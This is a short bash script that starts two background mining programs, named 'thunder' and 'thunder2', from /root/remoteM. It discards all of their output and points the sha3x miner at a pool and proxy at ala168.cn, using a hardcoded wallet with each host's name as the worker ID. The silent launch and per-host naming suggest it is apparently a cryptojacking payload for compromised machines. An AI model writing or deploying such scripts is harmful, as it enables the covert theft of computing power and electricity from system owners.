#!/bin/bash
id1=87CdGvxKktVNebisEHVzNwCjPeS54wrPkBAMuGViHNDMjWBU4hwoubRLagcxFEUo2K5kcJ4QSVanEPag9UDr4s9bQSYQ4hz
id2=125fka2fSVTvhv6dSTzMWQNN3ZBLWZNQLneH8BKqLH8aYUANvVFtLWL7457cQnCfMvXuSizBaH5k5b6DnmupCiPdjjG
port=64520
pool1=ala168.cn:431
pool2=ala168.cn:6452
proxy=ala168.cn:64520

nohup /root/remoteM/thunder --config=config.json > /dev/null 2>&1 &
sleep 1
nohup /root/remoteM/thunder2 --algorithm sha3x --pool $pool2 --wallet $id2.$(hostname) --tls true --proxy $proxy > /dev/null 2>&1 & 
